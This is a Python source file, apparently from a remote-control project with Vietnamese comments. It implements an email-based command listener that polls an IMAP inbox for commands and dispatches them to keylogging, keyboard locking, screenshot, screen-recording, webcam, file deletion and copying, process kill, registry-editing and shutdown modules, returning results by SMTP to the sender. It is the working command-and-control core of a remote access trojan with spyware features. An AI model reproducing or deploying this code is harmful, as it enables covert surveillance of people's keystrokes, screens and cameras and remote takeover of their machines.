import os 
import imaplib
import smtplib 
import hashlib

import email
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email import encoders

import function.directory_tree as dt
import function.app_process as ap
import function.keylogger as key
import function.screen as screen
import function.shutdown as sd
import function.camera as camera
import function.registry as reg 

def contentHTML(html): 
    part = MIMEText(html, 'html')
    return part

def contentFile(data, fileName): 
    part = MIMEBase('application', "octet-stream")
    part.set_payload(data)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename="{fileName}"')
    return part

def contentText(text): 
    plain_text = MIMEText(text, _subtype='plain', _charset='UTF-8')
    return plain_text

def strToMD5(str):
    return hashlib.md5(str.encode()).hexdigest()

class Listener():
    def __init__(self, SMTP_HOST, IMAP_HOST, SERVER_ADDRESS, SERVER_PASSWORD, screenInfo): 
        self.smtp = smtplib.SMTP_SSL(SMTP_HOST) 
        self.imap = imaplib.IMAP4_SSL(IMAP_HOST)
        self.login(SERVER_ADDRESS, SERVER_PASSWORD)
        self.screenInfo = screenInfo

    def __del__(self): 
        # stop lisenter 
        key.flag = 4

    def login(self, ADDR, PASS): 
        try:    
            self.smtp.login(ADDR, PASS) 
            self.imap.login(ADDR, PASS)
            self.ADDR = ADDR
            return True
        except:     
            return False

    def create_ID(self, ID): 
        self.imap.select('inbox')
        status, data = self.imap.search(None, 'UNSEEN', 'FROM', f'{self.ADDR}', 'SUBJECT', f'{strToMD5(ID)}')
        mail_ids = []
        for block in data:
            mail_ids += block.split()
        if (len(mail_ids) > 0): 
            return False 
        # create ID in server mail
        msg = MIMEMultipart("alternative")
        msg["Subject"] = f'{strToMD5(ID)}'
        msg["From"] = self.ADDR
        msg["To"] = self.ADDR
        self.smtp.sendmail(self.ADDR, self.ADDR, msg.as_string())
        self.ID = ID
        return True

    def delete_ID(self, delID): 
        # delete ID in server mail 
        self.imap.select('inbox')
        status, data = self.imap.search(None, 'UNSEEN', 'FROM', f'{self.ADDR}', 'SUBJECT', f'{strToMD5(delID)}')
        mail_ids = []
        for block in data:
            mail_ids += block.split()
        for id in mail_ids:
            self.imap.fetch(id, '(RFC822)')

    def download_file(self, msg, path): 
        if (not os.path.isdir(path)): 
            return False
        for part in msg.walk(): 
            if part.get_content_maintype() == 'multipart': 
                continue 
            if (part.get('Content-Disposition') is None): 
                continue 
            fileName = part.get_filename() 

            if (bool(fileName)): 
                filepath = os.path.join(path, fileName) 
                try: 
                    with open(filepath, 'wb') as f: 
                        f.write(part.get_payload(decode=True))
                except: 
                    return False
        return True

    def get_request(self, msg): 
        for part in msg.walk():
            if (part.get_content_type() == 'text/plain'):
                return part.get_payload(decode = False)[:-1]
        return 'None'

    # DIRECTORY LIST_TREE <path>: in ra cây thư mục gốc là thư mục <path> 
    # DIRECTORY LIST_DIR <path>: in ra tất cả thư mục, file nằm trong thư mục <path>
    # DIRECTORY LIST_DISK: in ra tất cả ổ đĩa trong máy tính 
    # DIRECTORY DELETE <path>: xóa thư mục hoặc file <path> 
    # DIRECTORY COPY <src> <dst>: copy thư mục hoặc file <src> đến đích <dst> 
    # DIRECTORY SAVE_FILE <dst>: lưu file từ file đính kèm tại email vào thư mục <dst>
    # PROCESS LIST_APPS: in ra tất cả ứng dụng đang chạy kèm port ID và thread 
    # PROCESS LIST_PROCESSES: in ra tất cả tiến trình đang chạy kèm port ID và thread 
    # PROCESS KILL <PortID>: tắt tiến trình đang chạy tại port <PortID> 
    # PROCESS START <App>: mở ứng dụng <App> 
    # KEYLOGGER HOOK: tắt/mở theo dõi bàn phím 
    # KEYLOGGER PRINT: in ra các phím đã bấm kèm thời gian 
    # KEYLOGGER LOCK: khóa bàn phím
    # KEYLOGGER UNLOCK: mở khóa bàn phím 
    # SCREEN TAKE: chụp màn hình 
    # SCREEN CAPTURE <n_seconds>: ghi màn hình <n_seconds> giây 
    # SHUTDOWN: tắt máy sau 3 giây
    # RESTART: khởi động lại máy sau 3 giây
    # LOGOUT: đăng xuất tài khoản hiện tại trên máy 
    # CAMERA <n_seconds>: quay camera <n_seconds> giây
    # REGISTRY GET_VALUE <path> <name_value>: lấy giá trị của <name_value> tại key có 
    #   đường dẫn <path> của registry 
    # REGISTRY SET_VALUE <path> <name_value> <value> <type>: đặt giá trị của <name_value> 
    #   tại key có đường dẫn <path> của registry thành giá trị <value> với kiểu dữ liệu là 
    #    <value>  (<value> là một trong những giá trị ['REG_SZ', 'REG_BINARY', 'REG_DWORD', 
    #   'REG_QWORD', 'REG_MULTI_SZ', 'REG_EXPAND_SZ'])
    # REGISTRY CREATE_KEY <path>: tạo key <path> 
    # REGISTRY DELETE_KEY <path>: xóa key <path>


    def handle_msg(self, msg):  
        request = self.get_request(msg).strip().upper()
        
        #print(request)
        if (request == 'None'): 
            return 
        if ('DIRECTORY' in request):  
            dt.handle_directory(self, request, msg)
        elif ('PROCESS' in request): 
            ap.handle_app_process(self, request) 
        elif ('KEYLOGGER' in request): 
            key.handle_keylog(self, request)
        elif ('SCREEN' in request): 
            screen.handle_screen(self, request, self.screenInfo) 
        elif ('SHUTDOWN' in request): 
            sd.shutdown()
        elif ('RESTART' in request):
            sd.restart() 
        elif ('LOGOUT' in request): 
            sd.logout()
        elif ('CAMERA' in request): 
            camera.handle_camera(self, request)
        elif ('REGISTRY' in request): 
            reg.handle_registry(self, request) 
            
    def send_msg(self, subject, content): 
        msg = MIMEMultipart("alternative")
        msg["Subject"] = f'{subject} (FROM ID: {self.ID})'
        msg["From"] = self.ADDR
        msg["To"] = self.CLIENT_ADDR
        for c in content: 
            if (c[1] == 'text'): 
                msg.attach(contentText(c[0]))
            elif (c[1] == 'html'): 
                msg.attach(contentHTML(c[0]))
            else: 
                msg.attach(contentFile(c[0], c[1]))

        self.smtp.sendmail(self.ADDR, self.CLIENT_ADDR, msg.as_string())

    def recv_msg(self): 
        self.imap.select('inbox')
        status, data = self.imap.search(None, 'UNSEEN', 'SUBJECT', f'{self.ID}')
        mail_ids = []
        for block in data:
            mail_ids += block.split()

        #print('Server is listening...')
        
        if (len(mail_ids) == 0): 
            return 

        for i in mail_ids:
            status, data = self.imap.fetch(i, '(RFC822)')
            for response_part in data:
                if isinstance(response_part, tuple):
                    msg = email.message_from_bytes(response_part[1])
                    subject = msg['subject']
                    self.CLIENT_ADDR = email.utils.parseaddr(msg['From'])[1]
                    self.handle_msg(msg)
